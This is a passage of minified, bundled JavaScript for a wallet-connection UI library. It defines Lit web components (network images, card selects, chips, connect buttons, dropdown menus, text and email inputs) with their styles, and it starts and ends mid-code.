`;var yee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Qv=class extends he{constructor(){super(...arguments),this.type="wallet"}render(){return F`
      ${this.shimmerTemplate()}
      <wui-shimmer width="56px" height="20px" borderRadius="xs"></wui-shimmer>
    `}shimmerTemplate(){return this.type==="network"?F` <wui-shimmer
          data-type=${this.type}
          width="48px"
          height="54px"
          borderRadius="xs"
        ></wui-shimmer>
        ${vee}`:F`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}};Qv.styles=[ht,fr,C$e];yee([V()],Qv.prototype,"type",void 0);Qv=yee([me("wui-card-select-loader")],Qv);const E$e=xe`<svg width="86" height="96" fill="none">
  <path
    d="M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z"
  />
</svg>`,_$e=xe`
  <svg fill="none" viewBox="0 0 36 40">
    <path
      d="M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z"
    />
  </svg>
`,S$e=ge`
  :host {
    position: relative;
    border-radius: inherit;
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-width);
    height: var(--local-height);
  }

  :host([data-round='true']) {
    background: var(--wui-color-gray-glass-002);
    border-radius: 100%;
    outline: 1px solid var(--wui-color-gray-glass-005);
  }

  svg {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    fill: var(--wui-color-gray-glass-002);
  }

  svg > path {
    stroke: var(--local-stroke);
  }

  wui-image {
    width: 100%;
    height: 100%;
    -webkit-clip-path: var(--local-path);
    clip-path: var(--local-path);
    background: var(--wui-color-gray-glass-002);
  }

  wui-icon {
    transform: translateY(-5%);
    width: var(--local-icon-size);
    height: var(--local-icon-size);
  }
`;var l2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Od=class extends he{constructor(){super(...arguments),this.size="md",this.name="uknown",this.networkImagesBySize={sm:_$e,md:vee,lg:E$e},this.selected=!1,this.round=!1}render(){return this.round?(this.dataset.round="true",this.style.cssText=`
      --local-width: var(--wui-spacing-3xl);
      --local-height: var(--wui-spacing-3xl);
      --local-icon-size: var(--wui-spacing-l);
    `):this.style.cssText=`

      --local-path: var(--wui-path-network-${this.size});
      --local-width:  var(--wui-width-network-${this.size});
      --local-height:  var(--wui-height-network-${this.size});
      --local-icon-size:  var(--wui-icon-size-network-${this.size});
    `,F`${this.templateVisual()} ${this.svgTemplate()} `}svgTemplate(){return this.round?null:this.networkImagesBySize[this.size]}templateVisual(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:F`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};Od.styles=[ht,S$e];l2([V()],Od.prototype,"size",void 0);l2([V()],Od.prototype,"name",void 0);l2([V({type:Object})],Od.prototype,"networkImagesBySize",void 0);l2([V()],Od.prototype,"imageSrc",void 0);l2([V({type:Boolean})],Od.prototype,"selected",void 0);l2([V({type:Boolean})],Od.prototype,"round",void 0);Od=l2([me("wui-network-image")],Od);const A$e=ge`
  button {
    flex-direction: column;
    width: 76px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) var(--wui-spacing-0);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
  }

  button > wui-text {
    color: var(--wui-color-fg-100);
    max-width: var(--wui-icon-box-size-xl);
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    justify-content: center;
  }

  button:disabled > wui-text {
    color: var(--wui-color-gray-glass-015);
  }

  [data-selected='true'] {
    background-color: var(--wui-color-accent-glass-020);
  }

  @media (hover: hover) and (pointer: fine) {
    [data-selected='true']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }
  }

  [data-selected='true']:active:enabled {
    background-color: var(--wui-color-accent-glass-010);
  }
`;var u2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Bd=class extends he{constructor(){super(...arguments),this.name="Unknown",this.type="wallet",this.imageSrc=void 0,this.disabled=!1,this.selected=!1,this.installed=!1}render(){return F`
      <button data-selected=${ye(this.selected)} ?disabled=${this.disabled}>
        ${this.imageTemplate()}
        <wui-text variant="tiny-500" color=${this.selected?"accent-100":"inherit"}>
          ${this.name}
        </wui-text>
      </button>
    `}imageTemplate(){return this.type==="network"?F`
        <wui-network-image
          .selected=${this.selected}
          imageSrc=${ye(this.imageSrc)}
          name=${this.name}
        >
        </wui-network-image>
      `:F`
      <wui-wallet-image
        size="md"
        imageSrc=${ye(this.imageSrc)}
        name=${this.name}
        .installed=${this.installed}
        badgeSize="sm"
      >
      </wui-wallet-image>
    `}};Bd.styles=[ht,fr,A$e];u2([V()],Bd.prototype,"name",void 0);u2([V()],Bd.prototype,"type",void 0);u2([V()],Bd.prototype,"imageSrc",void 0);u2([V({type:Boolean})],Bd.prototype,"disabled",void 0);u2([V({type:Boolean})],Bd.prototype,"selected",void 0);u2([V({type:Boolean})],Bd.prototype,"installed",void 0);Bd=u2([me("wui-card-select")],Bd);const I$e=ge`
  a {
    border: 1px solid var(--wui-color-gray-glass-010);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-image {
    border-radius: var(--wui-border-radius-3xl);
    overflow: hidden;
  }

  a.disabled > wui-icon:not(.image-icon),
  a.disabled > wui-image {
    filter: grayscale(1);
  }

  a[data-variant='fill'] {
    color: var(--wui-color-inverse-100);
    background-color: var(--wui-color-accent-100);
  }

  a[data-variant='shade'],
  a[data-variant='shadeSmall'] {
    background-color: transparent;
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-200);
  }

  a[data-variant='success'] {
    column-gap: var(--wui-spacing-xxs);
    border: 1px solid var(--wui-color-success-glass-010);
    background-color: var(--wui-color-success-glass-010);
    color: var(--wui-color-success-100);
  }

  a[data-variant='error'] {
    column-gap: var(--wui-spacing-xxs);
    border: 1px solid var(--wui-color-error-glass-010);
    background-color: var(--wui-color-error-glass-010);
    color: var(--wui-color-error-100);
  }

  a[data-variant='transparent'] {
    column-gap: var(--wui-spacing-xxs);
    background-color: transparent;
    color: var(--wui-color-fg-150);
  }

  a[data-variant='transparent'],
  a[data-variant='success'],
  a[data-variant='shadeSmall'],
  a[data-variant='error'] {
    padding: 7px var(--wui-spacing-s) 7px 10px;
  }

  a[data-variant='transparent']:has(wui-text:first-child),
  a[data-variant='success']:has(wui-text:first-child),
  a[data-variant='shadeSmall']:has(wui-text:first-child),
  a[data-variant='error']:has(wui-text:first-child) {
    padding: 7px var(--wui-spacing-s);
  }

  a[data-variant='fill'],
  a[data-variant='shade'] {
    column-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xxs) var(--wui-spacing-m) var(--wui-spacing-xxs)
      var(--wui-spacing-xs);
  }

  a[data-variant='fill']:has(wui-text:first-child),
  a[data-variant='shade']:has(wui-text:first-child) {
    padding: 9px var(--wui-spacing-m) 9px var(--wui-spacing-m);
  }

  a[data-variant='fill'] > wui-image,
  a[data-variant='shade'] > wui-image {
    width: 24px;
    height: 24px;
  }

  a[data-variant='fill'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-accent-090);
  }

  a[data-variant='shade'] > wui-image,
  a[data-variant='shadeSmall'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  a[data-variant='fill'] > wui-icon:not(.image-icon),
  a[data-variant='shade'] > wui-icon:not(.image-icon) {
    width: 14px;
    height: 14px;
  }

  a[data-variant='transparent'] > wui-image,
  a[data-variant='success'] > wui-image,
  a[data-variant='shadeSmall'] > wui-image,
  a[data-variant='error'] > wui-image {
    width: 14px;
    height: 14px;
  }

  a[data-variant='transparent'] > wui-icon:not(.image-icon),
  a[data-variant='success'] > wui-icon:not(.image-icon),
  a[data-variant='shadeSmall'] > wui-icon:not(.image-icon),
  a[data-variant='error'] > wui-icon:not(.image-icon) {
    width: 12px;
    height: 12px;
  }

  a[data-variant='fill']:focus-visible {
    background-color: var(--wui-color-accent-090);
  }

  a[data-variant='shade']:focus-visible,
  a[data-variant='shadeSmall']:focus-visible {
    background-color: var(--wui-color-gray-glass-015);
  }

  a[data-variant='transparent']:focus-visible {
    background-color: var(--wui-color-gray-glass-005);
  }

  a[data-variant='success']:focus-visible {
    background-color: var(--wui-color-success-glass-015);
  }

  a[data-variant='error']:focus-visible {
    background-color: var(--wui-color-error-glass-015);
  }

  a.disabled {
    color: var(--wui-color-gray-glass-015);
    background-color: var(--wui-color-gray-glass-015);
    pointer-events: none;
  }

  @media (hover: hover) and (pointer: fine) {
    a[data-variant='fill']:hover {
      background-color: var(--wui-color-accent-090);
    }

    a[data-variant='shade']:hover,
    a[data-variant='shadeSmall']:hover {
      background-color: var(--wui-color-gray-glass-015);
    }

    a[data-variant='transparent']:hover {
      background-color: var(--wui-color-gray-glass-005);
    }

    a[data-variant='success']:hover {
      background-color: var(--wui-color-success-glass-015);
    }

    a[data-variant='error']:hover {
      background-color: var(--wui-color-error-glass-015);
    }
  }

  a[data-variant='fill']:active {
    background-color: var(--wui-color-accent-080);
  }

  a[data-variant='shade']:active,
  a[data-variant='shadeSmall']:active {
    background-color: var(--wui-color-gray-glass-020);
  }

  a[data-variant='transparent']:active {
    background-color: var(--wui-color-gray-glass-010);
  }

  a[data-variant='success']:active {
    background-color: var(--wui-color-success-glass-020);
  }

  a[data-variant='error']:active {
    background-color: var(--wui-color-error-glass-020);
  }
`;var $0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ol=class extends he{constructor(){super(...arguments),this.variant="fill",this.imageSrc=void 0,this.imageIcon=void 0,this.imageIconSize="md",this.disabled=!1,this.icon="externalLink",this.href="",this.text=void 0}render(){const t=this.variant==="success"||this.variant==="transparent"||this.variant==="shadeSmall"?"small-600":"paragraph-600";return F`
      <a
        rel="noreferrer"
        target="_blank"
        href=${this.href}
        class=${this.disabled?"disabled":""}
        data-variant=${this.variant}
      >
        ${this.imageTemplate()}
        <wui-text variant=${t} color="inherit">
          ${this.title?this.title:Wt.getHostName(this.href)}
        </wui-text>
        <wui-icon name=${this.icon} color="inherit" size="inherit"></wui-icon>
      </a>
    `}imageTemplate(){return this.imageSrc?F`<wui-image src=${this.imageSrc}></wui-image>`:this.imageIcon?F`<wui-icon
        name=${this.imageIcon}
        color="inherit"
        size=${this.imageIconSize}
        class="image-icon"
      ></wui-icon>`:null}};ol.styles=[ht,fr,I$e];$0([V()],ol.prototype,"variant",void 0);$0([V()],ol.prototype,"imageSrc",void 0);$0([V()],ol.prototype,"imageIcon",void 0);$0([V()],ol.prototype,"imageIconSize",void 0);$0([V({type:Boolean})],ol.prototype,"disabled",void 0);$0([V()],ol.prototype,"icon",void 0);$0([V()],ol.prototype,"href",void 0);$0([V()],ol.prototype,"text",void 0);ol=$0([me("wui-chip")],ol);const T$e=ge`
  :host {
    position: relative;
    display: block;
  }

  button {
    background: var(--wui-color-accent-100);
    border: 1px solid var(--wui-color-gray-glass-010);
    border-radius: var(--wui-border-radius-m);
    gap: var(--wui-spacing-xs);
  }

  button.loading {
    background: var(--wui-color-gray-glass-010);
    border: 1px solid var(--wui-color-gray-glass-010);
    pointer-events: none;
  }

  button:disabled {
    background-color: var(--wui-color-gray-glass-015);
    border: 1px solid var(--wui-color-gray-glass-010);
  }

  button:disabled > wui-text {
    color: var(--wui-color-gray-glass-015);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button:active:enabled {
      background-color: var(--wui-color-accent-080);
    }
  }

  button:focus-visible {
    border: 1px solid var(--wui-color-gray-glass-010);
    background-color: var(--wui-color-accent-090);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  button[data-size='sm'] {
    padding: 6.75px 10px 7.25px;
  }

  ::slotted(*) {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
  }

  button > wui-text {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
    color: var(--wui-color-inverse-100);
  }

  button[data-size='md'] {
    padding: 9px var(--wui-spacing-l) 9px var(--wui-spacing-l);
  }

  button[data-size='md'] + wui-text {
    padding-left: var(--wui-spacing-3xs);
  }

  @media (max-width: 500px) {
    button[data-size='md'] {
      height: 32px;
      padding: 5px 12px;
    }

    button[data-size='md'] > wui-text > slot {
      font-size: 14px !important;
    }
  }

  wui-loading-spinner {
    width: 14px;
    height: 14px;
  }

  wui-loading-spinner::slotted(svg) {
    width: 10px !important;
    height: 10px !important;
  }

  button[data-size='sm'] > wui-loading-spinner {
    width: 12px;
    height: 12px;
  }
`;var MR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Mw=class extends he{constructor(){super(...arguments),this.size="md",this.loading=!1}render(){const e=this.size==="md"?"paragraph-600":"small-600";return F`
      <button data-size=${this.size} ?disabled=${this.loading}>
        ${this.loadingTemplate()}
        <wui-text variant=${e} color=${this.loading?"accent-100":"inherit"}>
          <slot></slot>
        </wui-text>
      </button>
    `}loadingTemplate(){return this.loading?F`<wui-loading-spinner size=${this.size} color="accent-100"></wui-loading-spinner>`:null}};Mw.styles=[ht,fr,T$e];MR([V()],Mw.prototype,"size",void 0);MR([V({type:Boolean})],Mw.prototype,"loading",void 0);Mw=MR([me("wui-connect-button")],Mw);const k$e=ge`
  wui-flex {
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }
`;var xC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let rg=class extends he{constructor(){super(...arguments),this.disabled=!1,this.label="",this.buttonLabel=""}render(){return F`
      <wui-flex
        justifyContent="space-between"
        alignItems="center"
        .padding=${["1xs","2l","1xs","2l"]}
      >
        <wui-text variant="paragraph-500" color="fg-200">${this.label}</wui-text>
        <wui-chip-button size="sm" variant="shade" text=${this.buttonLabel} icon="chevronRight">
        </wui-chip-button>
      </wui-flex>
    `}};rg.styles=[ht,fr,k$e];xC([V({type:Boolean})],rg.prototype,"disabled",void 0);xC([V()],rg.prototype,"label",void 0);xC([V()],rg.prototype,"buttonLabel",void 0);rg=xC([me("wui-cta-button")],rg);const N$e=ge`
  :host {
    display: block;
    padding: var(--wui-spacing-l) var(--wui-spacing-m);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    width: 100%;
  }
`;var P$e=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let m7=class extends he{render(){return F`
      <wui-flex gap="xl" flexDirection="column" justifyContent="space-between" alignItems="center">
        <slot></slot>
      </wui-flex>
    `}};m7.styles=[ht,fr,N$e];m7=P$e([me("wui-details-group")],m7);const $$e=ge`
  :host {
    display: flex;
    flex-direction: row;
    gap: var(--wui-spacing-l);
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
  }
`;var xee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Xv=class extends he{constructor(){super(...arguments),this.name=""}render(){return F`
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="paragraph-500" color="fg-200">${this.name}</wui-text>
        <wui-flex gap="xs" alignItems="center">
          <slot></slot>
        </wui-flex>
      </wui-flex>
    `}};Xv.styles=[ht,fr,$$e];xee([V()],Xv.prototype,"name",void 0);Xv=xee([me("wui-details-group-item")],Xv);const R$e=ge`
  :host {
    z-index: calc(var(--w3m-z-index) + 1);
    width: 200px;
    padding: var(--wui-spacing-3xs);
    align-items: center;
    display: inherit;
    border-radius: var(--wui-border-radius-xs);
    border: 1px solid var(--wui-color-gray-glass-002);
    background: var(--wui-color-fg-base-125);
    /* Dark/Elevation/L */
    box-shadow:
      0px 8px 22px -6px rgba(0, 0, 0, 0.12),
      0px 14px 64px -4px rgba(0, 0, 0, 0.12);
  }
`;var DR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Dw=class extends he{constructor(){super(...arguments),this.actions=[],this.isOpen=!1}render(){return this.isOpen?F`
      <wui-flex flexDirection="column" gap="4xs">
        ${this.actions.map(e=>F`
            <wui-list-item
              icon=${e.icon}
              iconSize="sm"
              variant="icon"
              @click=${e.onClick}
            >
              <wui-text variant="small-400" color="fg-100">${e.label}</wui-text>
            </wui-list-item>
          `)}
      </wui-flex>
    `:null}};Dw.styles=[ht,fr,R$e];DR([V({type:Array})],Dw.prototype,"actions",void 0);DR([V({type:Boolean})],Dw.prototype,"isOpen",void 0);Dw=DR([me("wui-dropdown-menu")],Dw);/**
 * @license
 * Copyright 2020 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const O$e=r=>r===null||typeof r!="object"&&typeof r!="function",B$e=r=>r.strings===void 0;/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const N5=(r,e)=>{const t=r._$AN;if(t===void 0)return!1;for(const i of t)i._$AO?.(e,!1),N5(i,e);return!0},w7=r=>{let e,t;do{if((e=r._$AM)===void 0)break;t=e._$AN,t.delete(r),r=e}while(t?.size===0)},Cee=r=>{for(let e;e=r._$AM;r=e){let t=e._$AN;if(t===void 0)e._$AN=t=new Set;else if(t.has(r))break;t.add(r),L$e(e)}};function M$e(r){this._$AN!==void 0?(w7(this),this._$AM=r,Cee(this)):this._$AM=r}function D$e(r,e=!1,t=0){const i=this._$AH,n=this._$AN;if(n!==void 0&&n.size!==0)if(e)if(Array.isArray(i))for(let s=t;s<i.length;s++)N5(i[s],!1),w7(i[s]);else i!=null&&(N5(i,!1),w7(i));else N5(this,r)}const L$e=r=>{r.type==mee.CHILD&&(r._$AP??=D$e,r._$AQ??=M$e)};let Eee=class extends wee{constructor(){super(...arguments),this._$AN=void 0}_$AT(e,t,i){super._$AT(e,t,i),Cee(this),this.isConnected=e._$AU}_$AO(e,t=!0){e!==this.isConnected&&(this.isConnected=e,e?this.reconnected?.():this.disconnected?.()),t&&(N5(this,e),w7(this))}setValue(e){if(B$e(this._$Ct))this._$Ct._$AI(e,this);else{const t=[...this._$Ct._$AH];t[this._$Ci]=e,this._$Ct._$AI(t,this,0)}}disconnected(){}reconnected(){}};/**
 * @license
 * Copyright 2020 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const gc=()=>new U$e;let U$e=class{};const cA=new WeakMap,mc=OR(class extends Eee{render(r){return Qn}update(r,[e]){const t=e!==this.G;return t&&this.G!==void 0&&this.rt(void 0),(t||this.lt!==this.ct)&&(this.G=e,this.ht=r.options?.host,this.rt(this.ct=r.element)),Qn}rt(r){if(this.isConnected||(r=void 0),typeof this.G=="function"){const e=this.ht??globalThis;let t=cA.get(e);t===void 0&&(t=new WeakMap,cA.set(e,t)),t.get(this.G)!==void 0&&this.G.call(this.ht,void 0),t.set(this.G,r),r!==void 0&&this.G.call(this.ht,r)}else this.G.value=r}get lt(){return typeof this.G=="function"?cA.get(this.ht??globalThis)?.get(this.G):this.G?.value}disconnected(){this.lt===this.ct&&this.rt(void 0)}reconnected(){this.rt(this.ct)}}),j$e=ge`
  :host {
    position: relative;
    width: 100%;
    display: inline-block;
    color: var(--wui-color-fg-275);
  }

  input {
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    background: var(--wui-color-gray-glass-002);
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
    color: var(--wui-color-fg-100);
    transition:
      background-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      border-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      box-shadow var(--wui-ease-inout-power-1) var(--wui-duration-md);
    will-change: background-color, border-color, box-shadow;
    caret-color: var(--wui-color-accent-100);
  }

  input:disabled {
    cursor: not-allowed;
    border: 1px solid var(--wui-color-gray-glass-010);
  }

  input:disabled::placeholder,
  input:disabled + wui-icon {
    color: var(--wui-color-fg-300);
  }

  input::placeholder {
    color: var(--wui-color-fg-275);
  }

  input:focus:enabled {
    background-color: var(--wui-color-gray-glass-005);
    -webkit-box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  input:hover:enabled {
    background-color: var(--wui-color-gray-glass-005);
  }

  wui-icon {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    pointer-events: none;
  }

  .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px var(--wui-spacing-s);
  }

  wui-icon + .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px 36px;
  }

  wui-icon[data-input='sm'] {
    left: var(--wui-spacing-s);
  }

  .wui-size-md {
    padding: 15px var(--wui-spacing-m) var(--wui-spacing-l) var(--wui-spacing-m);
  }

  wui-icon + .wui-size-md,
  wui-loading-spinner + .wui-size-md {
    padding: 10.5px var(--wui-spacing-3xl) 10.5px var(--wui-spacing-3xl);
  }

  wui-icon[data-input='md'] {
    left: var(--wui-spacing-l);
  }

  .wui-size-lg {
    padding: var(--wui-spacing-s) var(--wui-spacing-s) var(--wui-spacing-s) var(--wui-spacing-l);
    letter-spacing: var(--wui-letter-spacing-medium-title);
    font-size: var(--wui-font-size-medium-title);
    font-weight: var(--wui-font-weight-light);
    line-height: 130%;
    color: var(--wui-color-fg-100);
    height: 64px;
  }

  .wui-padding-right-xs {
    padding-right: var(--wui-spacing-xs);
  }

  .wui-padding-right-s {
    padding-right: var(--wui-spacing-s);
  }

  .wui-padding-right-m {
    padding-right: var(--wui-spacing-m);
  }

  .wui-padding-right-l {
    padding-right: var(--wui-spacing-l);
  }

  .wui-padding-right-xl {
    padding-right: var(--wui-spacing-xl);
  }

  .wui-padding-right-2xl {
    padding-right: var(--wui-spacing-2xl);
  }

  .wui-padding-right-3xl {
    padding-right: var(--wui-spacing-3xl);
  }

  .wui-padding-right-4xl {
    padding-right: var(--wui-spacing-4xl);
  }

  .wui-padding-right-5xl {
    padding-right: var(--wui-spacing-5xl);
  }

  wui-icon + .wui-size-lg,
  wui-loading-spinner + .wui-size-lg {
    padding-left: 50px;
  }

  wui-icon[data-input='lg'] {
    left: var(--wui-spacing-l);
  }

  .wui-size-mdl {
    padding: 17.25px var(--wui-spacing-m) 17.25px var(--wui-spacing-m);
  }
  wui-icon + .wui-size-mdl,
  wui-loading-spinner + .wui-size-mdl {
    padding: 17.25px var(--wui-spacing-3xl) 17.25px 40px;
  }
  wui-icon[data-input='mdl'] {
    left: var(--wui-spacing-m);
  }

  input:placeholder-shown ~ ::slotted(wui-input-element),
  input:placeholder-shown ~ ::slotted(wui-icon) {
    opacity: 0;
    pointer-events: none;
  }

  input::-webkit-outer-spin-button,
  input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  input[type='number'] {
    -moz-appearance: textfield;
  }

  ::slotted(wui-input-element),
  ::slotted(wui-icon) {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
  }

  ::slotted(wui-input-element) {
    right: var(--wui-spacing-m);
  }

  ::slotted(wui-icon) {
    right: 0px;
  }
`;var Xd=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let wc=class extends he{constructor(){super(...arguments),this.inputElementRef=gc(),this.size="md",this.disabled=!1,this.placeholder="",this.type="text",this.value=""}render(){const e=`wui-padding-right-${this.inputRightPadding}`,i={[`wui-size-${this.size}`]:!0,[e]:!!this.inputRightPadding};return F`${this.templateIcon()}
      <input
        data-testid="wui-input-text"
        ${mc(this.inputElementRef)}
        class=${Ow(i)}
        type=${this.type}
        enterkeyhint=${ye(this.enterKeyHint)}
        ?disabled=${this.disabled}
        placeholder=${this.placeholder}
        @input=${this.dispatchInputChangeEvent.bind(this)}
        .value=${this.value||""}
        tabindex=${ye(this.tabIdx)}
      />
      <slot></slot>`}templateIcon(){return this.icon?F`<wui-icon
        data-input=${this.size}
        size=${this.size}
        color="inherit"
        name=${this.icon}
      ></wui-icon>`:null}dispatchInputChangeEvent(){this.dispatchEvent(new CustomEvent("inputChange",{detail:this.inputElementRef.value?.value,bubbles:!0,composed:!0}))}};wc.styles=[ht,fr,j$e];Xd([V()],wc.prototype,"size",void 0);Xd([V()],wc.prototype,"icon",void 0);Xd([V({type:Boolean})],wc.prototype,"disabled",void 0);Xd([V()],wc.prototype,"placeholder",void 0);Xd([V()],wc.prototype,"type",void 0);Xd([V()],wc.prototype,"keyHint",void 0);Xd([V()],wc.prototype,"value",void 0);Xd([V()],wc.prototype,"inputRightPadding",void 0);Xd([V()],wc.prototype,"tabIdx",void 0);wc=Xd([me("wui-input-text")],wc);const F$e=ge`
  :host {
    position: relative;
    display: inline-block;
  }

  wui-text {
    margin: var(--wui-spacing-xxs) var(--wui-spacing-m) var(--wui-spacing-0) var(--wui-spacing-m);
  }
`;var C4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let up=class extends he{constructor(){super(...arguments),this.disabled=!1}render(){return F`
      <wui-input-text
        type="email"
        placeholder="Email"
        icon="mail"
        size="mdl"
        .disabled=${this.disabled}
        .value=${this.value}
        data-testid="wui-email-input"
